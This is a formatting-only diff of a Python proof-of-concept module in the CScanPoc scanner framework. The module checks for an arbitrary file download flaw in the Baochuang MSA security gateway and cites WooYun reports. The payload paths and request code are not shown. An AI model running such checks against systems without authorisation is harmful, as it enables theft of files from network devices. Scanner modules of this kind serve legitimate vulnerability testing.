@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'Baochuang_0001'  # 平台漏洞编号，留空
     name = '宝创科技MSA 处任意文件下载'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2015-05-26'  # 漏洞公布时间
     desc = '''
         上海宝创科技 MSA 新一代网关安全与管理的领导者，访问以下页面可直接下载相应文件。
@@ -20,6 +21,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '宝创科技MSA'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '77937a7a-60cf-4f0b-a3b1-522aeee888c6'
@@ -34,8 +36,8 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #refer: http://wooyun.org/bugs/wooyun-2015-0112275
-            #refer: http://www.wooyun.org/bugs/wooyun-2010-0115645
+            # refer: http://wooyun.org/bugs/wooyun-2015-0112275
+            # refer: http://www.wooyun.org/bugs/wooyun-2010-0115645
             hh = hackhttp.hackhttp()
             arg = self.target
             payloads = [
@@ -55,6 +57,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
